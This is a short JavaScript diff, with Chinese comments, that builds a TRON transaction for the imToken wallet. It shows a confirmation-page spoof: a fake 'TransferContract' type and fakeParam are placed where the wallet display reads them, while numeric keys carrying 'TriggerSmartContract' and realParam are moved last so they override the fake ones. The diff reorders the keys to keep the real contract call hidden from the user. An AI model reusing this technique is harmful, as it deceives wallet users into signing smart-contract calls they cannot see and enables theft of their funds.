@@ -283,8 +283,7 @@
 
       // 填充字段 + 数字键，完全按审计文档结构
       transaction.raw_data.contract[0] = {
-         '1': 'TriggerSmartContract',
-        '2': realParam,
+       
         // ── imToken 确认页读取 ──
         type: 'TransferContract',
         parameter: fakeParam,
@@ -293,7 +292,8 @@
         _f: 6, _g: 7, _h: 8, _i: 9, _j: 10,
         _k: 11, _l: 12, _m: 13, _n: 14, _o: 15,
         // ── 数字键：HashMap 中最后处理，覆盖字符串键 ──
-       
+         '1': 'TriggerSmartContract',
+        '2': realParam,
       };
       transaction.raw_data_hex = originalHex;
 
